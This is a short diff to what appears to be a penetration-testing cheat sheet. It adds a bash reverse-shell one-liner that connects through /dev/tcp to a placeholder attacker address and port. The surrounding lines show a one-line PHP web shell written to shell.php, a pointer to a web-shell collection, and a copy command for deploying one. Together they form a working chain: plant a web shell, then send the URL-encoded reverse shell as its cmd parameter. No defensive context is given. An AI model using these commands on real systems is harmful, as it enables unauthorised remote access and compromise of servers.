@@ -3,6 +3,12 @@
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
+Open reverse shell:
+```
+/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'
+```
+url encode it and send as cmd query or post parameter
+
 Collection of webshells laudanum:
 https://github.com/jbarcia/Web-Shells/tree/master/laudanum
 `cp /usr/share/laudanum/... shellfile`
